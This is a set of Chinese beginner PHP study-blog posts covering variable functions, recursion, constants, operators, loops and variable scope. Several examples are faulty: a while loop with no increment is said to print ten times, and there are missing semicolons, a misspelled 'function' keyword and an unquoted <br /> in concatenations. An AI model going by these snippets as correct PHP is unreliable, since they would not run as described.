<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"这是一个函数！！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="string">'model'</span>;</span><br><span class="line">$i();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200521235940327.png" alt="在这里插入图片描述"><br>可变函数使用，加上引号（单引号，双引号都可以）。</p>
<h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>递归函数就是在函数里面再调用一次自身函数，简称无形套娃。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   <span class="keyword">if</span>($a&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"这是递归函数"</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">      model($a<span class="number">-1</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"函数结束"</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">model(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200522001416804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>使用递归函数需要有适当的循环结束条件，避免占用内存过大。</strong></p>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
<p>PHP 的真正威力源自于它的函数。 在 PHP 中，提供了超过 1000 个内建的函数</p>
</blockquote>
<p>可以自己了解，比较多，慢慢在学习使用过程中会了解到。</p>
<blockquote>
<p>boolval    获取变量的布尔值<br>debug_zval_dump    查看一个变量在zend引擎中的引用计数、类型信息<br>doubleval    floatval 的别名<br>empty    检查一个变量是否为空<br>floatval    获取变量的浮点值<br>get_defined_vars    返回由所有已定义变量所组成的数组<br>get_resource_type    返回资源（resource）类型<br>gettype    获取变量的类型<br>import_request_variables    将 GET／POST／Cookie 变量导入到全局作用域中<br>intval    获取变量的整数值<br>is_array    检测变量是否是数组<br>is_bool    检测变量是否是布尔型<br>is_callable    检测参数是否为合法的可调用结构<br>is_double    is_float 的别名<br>is_float    检测变量是否是浮点型<br>is_int    检测变量是否是整数<br>is_integer    is_int 的别名<br>is_iterable    检测变量的内容是否是一个可迭代的值<br>is_long    is_int 的别名<br>is_null    检测变量是否为 NULL<br>is_numeric    检测变量是否为数字或数字字符串<br>is_object    检测变量是否是一个对象<br>is_real    is_float 的别名<br>is_resource    检测变量是否为资源类型<br>is_scalar    检测变量是否是一个标量<br>is_string    检测变量是否是字符串<br>isset    检测变量是否已设置并且非 NULL<br>print_r    打印变量，输出易于阅读的信息。<br>serialize    序列化对象<br>settype    设置变量的类型<br>strval    获取变量的字符串值<br>unserialize    从已存储的表示中创建 PHP 的值<br>unset    释放给定的变量<br>var_dump    打印变量的相关信息<br>var_export    输出或返回一个变量，以字符串形式表示</p>
</blockquote>
<p>简单的罗列出了一点函数。<br>详细的请看<a href="https://www.php.net/manual/zh/functions.internal.php" target="_blank" rel="noopener">PHP手册</a>。</p>
]]></content>
  </entry>
  <entry>
    <title>PHP学习第二弹</title>
    <url>/2020/04/14/PHP%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%BC%B9/</url>
    <content><![CDATA[<p>@<a href="php学习总结">TOC</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>上次对于PHP的变量进行了学习，这一周就针对常量进行了简单的学习，顺便记录一下，并且补充一下上周有关变量的一些东西。</code></pre><h2 id="变量的补充"><a href="#变量的补充" class="headerlink" title="变量的补充"></a>变量的补充</h2><p>上周学习了变量的基本种类，以及几个作用域，但是关于变量的类型以及赋值，输出没有写到，补充回来。<br><strong>变量的类型</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">整数</span><br><span class="line">浮点数</span><br><span class="line">逻辑（布尔类型）</span><br><span class="line">字符串</span><br><span class="line">数组</span><br><span class="line">对象</span><br><span class="line">资源</span><br><span class="line">null值</span><br></pre></td></tr></table></figure>
<p>前面几个不用说，和其他语言差不多，先看一个例子<br><img src="https://img-blog.csdnimg.cn/2020040818035174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在上面图片中，运用了<strong>var_dump()</strong> 来显示变量的类型以及变量的值。<strong>unset()</strong> 用于删除变量。<br><strong>字符串的赋值</strong><br>字符串赋值有几种方法：</p>
<blockquote>
<p>1、单引号  如： $a=’hello!’<br>2、双引号  如： $a=”hello!”</p>
<p>3、&lt;&lt;&lt;变量名   变量值  变量名； 如：$a=&lt;&lt;&lt;max  666  max;</p>
</blockquote>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量本人感觉和变量差别不大，只是定义方式不一样。<br>不同的是，常量一经定义，值无法发生改变，变量可以。</p>
<h3 id="常量的定义"><a href="#常量的定义" class="headerlink" title="常量的定义"></a>常量的定义</h3><p>常量的定义与变量不同，变量直接<strong>$变量名字</strong>来定义，常量的定义格式为：<br><strong>define(‘常量名字’，常量值)</strong>或者<strong>define(“常量名字”，常量值)</strong>两种格式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'MY_NAME'</span>,<span class="string">'张三'</span>);</span><br><span class="line"><span class="keyword">echo</span> MY_NAME;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要注意，在对于常量的输出时，不能在常量名字上加上引号。</p>
<h3 id="常量对于变量的区别"><a href="#常量对于变量的区别" class="headerlink" title="常量对于变量的区别"></a>常量对于变量的区别</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">常量不用<span class="variable">$</span>来定义，而用define()来定义</span><br><span class="line">常量可以在全局使用，而不用局限于变量的作用规则</span><br><span class="line">常量一经定义无法重新定义</span><br><span class="line">常量的数据类型只能是 布尔型，整型，浮点型，字符串</span><br></pre></td></tr></table></figure>
<h3 id="常量的命名规则"><a href="#常量的命名规则" class="headerlink" title="常量的命名规则"></a>常量的命名规则</h3><p>与变量一样，只能由字母，数字，下划线构成，且不能用数字开头。<br>在常量命名中，按照习惯都是大写字母，但是用小写字母不会报错。<br><img src="https://img-blog.csdnimg.cn/2020040818275222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>在PHP中，存在许多内核定义过的常量名字，交做预定义常量。<br>可以通过一个函数<strong>print_r(get_defined_constants())</strong>来查看。<br><img src="https://img-blog.csdnimg.cn/20200408183205873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h4><p>常见的魔术常量：<a href="https://www.php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener">在这里</a><br>里面有具体的说法，在这里，我就简单的记录一下。<br><strong><strong>FILE</strong></strong><br>展示当前的文件路径和文件名<br><img src="https://img-blog.csdnimg.cn/20200408183819886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><strong>LINE</strong></strong><br>展示当前的行数。<br><img src="https://img-blog.csdnimg.cn/20200408184003454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在这里要注意，预定义常量名字是不区分大小写的。</strong></p>
<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>在这里就简单的写了这两种基本的魔术变量。<br>下次来学习运算符方面的知识</p>
]]></content>
  </entry>
  <entry>
    <title>PHP入门学习第三弹</title>
    <url>/2020/04/14/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%BC%B9/</url>
    <content><![CDATA[<p>@<a href="这里写目录标题">TOC</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次学习了PHP语言的常量内容，并对之前的变量内容进行了补充，这次来说一下运算符以及一些语句</p>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>运算符就是对于数据进行运算处理的符号。</p>
<h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>算术运算符有：<strong>“+”</strong>、<strong>“-”</strong>、<strong>“*”</strong>、<strong>“/”</strong>、<strong>“%”</strong>、<strong>“++”</strong>、<strong>“–”</strong>这几类</p>
<h4 id=""><a href="#" class="headerlink" title="+"></a>+</h4><p><strong>“+”</strong>就单纯的是个加号，表示两个数据相加的结果<br><img src="https://img-blog.csdnimg.cn/20200413180056745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在这里我其实有一个疑问，就是为什么字符串在单纯的就是这样一个＋号表达式里会被认为是0处理？</strong><br>关于这个，我在网上进行了查找，找到了问题的答案，就是说字符串在与整数相加时，有着如下的转换规律：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">'1aaa' =&gt; 1</span><br><span class="line">'11aaa' =&gt; 11</span><br><span class="line">'222asdsa' =&gt; 222</span><br><span class="line">'aaaaa1'=&gt;0</span><br></pre></td></tr></table></figure>
<p>就是说字符串开头没有数值的话，会按0处理，而有数值的话会转换成相应的数值，即：<br><img src="https://img-blog.csdnimg.cn/20200413181104441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="-1"><a href="#-1" class="headerlink" title="-"></a>-</h4><p><strong>“-”</strong>其实和上面说的一样。这里不进行过多的记录了就。<br><img src="https://img-blog.csdnimg.cn/20200413181303700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过<strong>“-”</strong> 还有一个意思，就是取反<br><img src="https://img-blog.csdnimg.cn/20200413223853706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="-2"><a href="#-2" class="headerlink" title="*"></a>*</h4><p><img src="https://img-blog.csdnimg.cn/20200413181432238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="-3"><a href="#-3" class="headerlink" title="/"></a>/</h4><p><img src="https://img-blog.csdnimg.cn/2020041318160076.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="-4"><a href="#-4" class="headerlink" title="%"></a>%</h4><p><strong>“%”</strong> 和别的语言其实一样，就是取余。<br><img src="https://img-blog.csdnimg.cn/20200413181712681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="-5"><a href="#-5" class="headerlink" title="++"></a>++</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//echo $a++;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> ++$a;</span><br></pre></td></tr></table></figure>
<p>对于这两种方法，输出的结果是不一样的。前加加表示先加，后加加表示后加，因此结果不一样，不过如果在前面先加加，在输出的话值是一样的。<br>不过如果上面的代码不把第三行注释掉的话，输出的结果就会变成  1    3。因为在<code>$a++</code>这一句中输出了a的值，再对a进行加加。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#$a++;</span></span><br><span class="line">++$a;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
<p>这样子输出的结果是一样的。<br>总的来说，就是前加加是先加，后返回；后加加是先返回后加。</p>
<h4 id="–"><a href="#–" class="headerlink" title="–"></a>–</h4><p><strong>“–”</strong> 和<strong>“++”</strong> 效果一样，就不多说了。<br><strong>注意：++和–是对于变量而言的</strong></p>
<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>字符串运算符是一个<strong>“.”</strong>，用于连接字符串。<br><img src="https://img-blog.csdnimg.cn/20200413223625893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>有<strong>“=”</strong>、<strong>“-”</strong>、<strong>“+=”</strong>、<strong>“-=”</strong>、<strong>“*=”</strong>、<strong>“/=”</strong>、<strong>“.=”</strong>、<strong>“%=”</strong> 几类。</p>
<h5 id="-6"><a href="#-6" class="headerlink" title="="></a>=</h5><p>可以把它看成是一个数学中的等于号，只不过叫做赋值，<br>比如：<code>$a=1</code>，就是指把 <strong>“1”</strong> 的值赋给 <strong>“变量a”</strong>。</p>
<h5 id="-7"><a href="#-7" class="headerlink" title="-"></a>-</h5><p>在上面说过了，就是指取相反数。</p>
<h5 id="、-、-、-、-、"><a href="#、-、-、-、-、" class="headerlink" title="+=、-=、*=、/=、.=、%="></a>+=、-=、*=、/=、.=、%=</h5><p>这几种的意思其实是一样的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a+=<span class="number">1</span>;<span class="comment">//$a=$a+1</span></span><br><span class="line">$a-=<span class="number">1</span>;<span class="comment">//$a=$a-1</span></span><br><span class="line">$a*=<span class="number">1</span>;<span class="comment">//$a=$a*1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><h4 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h4><p><strong>==（等于）</strong>、<strong>===（全等）</strong>、<strong>！=（不等于）&lt;&gt;</strong>、<strong>！===（不全等）</strong>、<strong>&gt;</strong>、<strong>&lt;</strong>、<strong>&gt;=</strong>、<strong>&lt;=</strong>。</p>
<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line">$b=<span class="string">'1'</span>;</span><br><span class="line">var_dump($a==$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a===$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a!=$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a&lt;&gt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a!==$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&gt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a&gt;=$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&lt;=$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&lt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="规定"><a href="#规定" class="headerlink" title="规定"></a>规定</h5><p>在对数据数进行比较操作时，输出的都是布尔类型数据。<br>在PHP中用<code>echo</code>输出布尔类型数据时，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">true</span>;<span class="comment">//输出1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">false</span><span class="comment">//无输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以用上面说过的<code>var_dump()</code>来输出。</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><h4 id="分类-3"><a href="#分类-3" class="headerlink" title="分类"></a>分类</h4><p>就是几种<strong>与、或、非、异或</strong>。</p>
<h5 id="逻辑运算规则"><a href="#逻辑运算规则" class="headerlink" title="逻辑运算规则"></a>逻辑运算规则</h5><p>运算的数值都是布尔类型，如果不是会自动转换为布尔类型，再进行运算。输出的也是布尔类型。</p>
<h6 id="认为是布尔类型是false的值"><a href="#认为是布尔类型是false的值" class="headerlink" title="认为是布尔类型是false的值"></a>认为是布尔类型是false的值</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、布尔值false</span><br><span class="line"><span class="number">2</span>、<span class="number">0</span></span><br><span class="line"><span class="number">3</span>、浮点型<span class="number">0.0</span></span><br><span class="line"><span class="number">4</span>、空白字符串和字符串<span class="number">0</span></span><br><span class="line"><span class="number">5</span>、没有成员的数组</span><br><span class="line"><span class="number">6</span>、NULL</span><br></pre></td></tr></table></figure>
<h5 id="逻辑运算符的使用"><a href="#逻辑运算符的使用" class="headerlink" title="逻辑运算符的使用"></a>逻辑运算符的使用</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">true</span>;</span><br><span class="line">$b=<span class="keyword">false</span>;</span><br><span class="line">var_dump($a &amp;&amp; $b)<span class="comment">//与运算 输出false</span></span><br><span class="line">var_dump($a <span class="keyword">and</span> $b)<span class="comment">//与运算 输出false</span></span><br><span class="line">var_dump($a <span class="keyword">or</span> $b)<span class="comment">//或运算 输出true</span></span><br><span class="line">var_dump($a || $b)<span class="comment">//或运算 输出true</span></span><br><span class="line">var_dump(!$b)<span class="comment">//非运算 输出true</span></span><br><span class="line">var_dump($a <span class="keyword">xor</span> $b)<span class="comment">//异或运算 输出true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>对操作数中的每一个二进制位进行运算。</p>
<h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><h4 id="-8"><a href="#-8" class="headerlink" title="?:"></a>?:</h4><p>三元运算符<br>使用格式：<code>表达式1 ? 表达式2 : 表达式3；</code><br>运算规则：<br><strong>如果表达式1为true，那么执行表达式2，否则执行表达式3</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">true</span> ? <span class="number">20</span> : <span class="number">10</span></span><br><span class="line"><span class="keyword">echo</span> $a;<span class="comment">//输出20</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="-9"><a href="#-9" class="headerlink" title="``"></a>``</h4><p>用途：<strong>可以将系统的命令放在代码里执行</strong><br>但是由于跨平台原因，很少用到，（个人感觉还有涉及到安全问题）。</p>
<h4 id="-10"><a href="#-10" class="headerlink" title="@"></a>@</h4><p>用途： <strong>屏蔽表达式可能出现的错误</strong><br>注意是表达式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $a;<span class="comment">//因为没有对变量a赋值，因此会报错</span></span><br><span class="line">@<span class="keyword">echo</span> $a;<span class="comment">//echo不是表达式，会报错</span></span><br><span class="line"><span class="keyword">echo</span> @$a;<span class="comment">//输出null</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="gt-、-gt-、instanceof"><a href="#gt-、-gt-、instanceof" class="headerlink" title="=&gt; 、-&gt; 、instanceof"></a>=&gt; 、-&gt; 、instanceof</h4><p>三种运算符还没有接触，之后往后面深入学习之后，会补充回来。</p>
<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>($i&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"while循环语句"</span>.&lt;br /&gt;<span class="comment">//输出十次“while循环语句”，换行输出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="do-while-循环语句"><a href="#do-while-循环语句" class="headerlink" title="do while 循环语句"></a>do while 循环语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"do while循环语句"</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"\n"</span></span><br><span class="line">  $i++;</span><br><span class="line">&#125;<span class="keyword">while</span>($i&lt;=<span class="number">10</span>)<span class="comment">//换行输出十次“do while循环语句”</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>; $a&lt;=<span class="number">10</span>; $a++)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"for循环语句"</span>.&lt;br /&gt;<span class="comment">//换行输出十次“for循环语句”</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="https://img-blog.csdnimg.cn/2020041400063849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>第三弹大概就学了这么多，等下次再总结其他的，<strong>加油！！！</strong></p>
]]></content>
  </entry>
  <entry>
    <title>PHP基本入门学习</title>
    <url>/2020/03/27/PHP%E5%9F%BA%E6%9C%AC%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>前言：上一篇博客介绍了PHP的环境搭建以及工具的使用，这次就来记录一下自己刚进行PHP学习学到的东西</p>
<h2 id="PHP的变量"><a href="#PHP的变量" class="headerlink" title="PHP的变量"></a>PHP的变量</h2><p>所谓变量，就是PHP语言中用来存储信息的“容器”。<br>如：输入一个x并进行赋值，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x=<span class="number">5</span>;</span><br><span class="line">  <span class="keyword">echo</span> $x;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样输出的就是5。<br><strong>PHP语言变量命名规则</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量以 $ 符号开始，后面跟着变量的名称</span><br><span class="line">变量名必须以字母或者下划线字符开始</span><br><span class="line">变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</span><br><span class="line">变量名不能包含空格</span><br><span class="line">变量名是区分大小写的（<span class="variable">$y</span> 和 <span class="variable">$Y</span> 是两个不同的变量）</span><br></pre></td></tr></table></figure>
<p><strong>需注意PHP和PHP变量都是区分大小写的</strong><br><strong>PHP变量的作用域</strong><br>变量的作用域就是指脚本中变量可别引用的部分，在PHP中有四大作用域</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">local</span></span><br><span class="line">global</span><br><span class="line">static</span><br><span class="line">parameter</span><br></pre></td></tr></table></figure>
<p><strong>global</strong><br>变量有局部变量和全局变量两大类，在一个函数中通过简单的输出全局变量是无法做到的。如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $x=<span class="number">4</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子运行之后输出的会是单纯的<strong>x的值是:</strong>，而不会出现x的值。<br><img src="https://img-blog.csdnimg.cn/20200327212305326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这时就需要用到<strong>global</strong>了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x=<span class="number">4</span>;</span><br><span class="line">  fuction test()&#123;</span><br><span class="line">   <span class="keyword">global</span> $x;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">&#125;</span><br><span class="line">  test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而执行之后就会出现<br><img src="https://img-blog.csdnimg.cn/20200327212932520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这就是<strong>global</strong>的作用。<br>在PHP中，所有全局变量存储在一个名为 $GLOBALS[index] 的数组中，因此可以在函数中调用这个数组来进行对全局变量的访问。（index记录变量的名称）<br>所以上面的代码可以写为：</p>
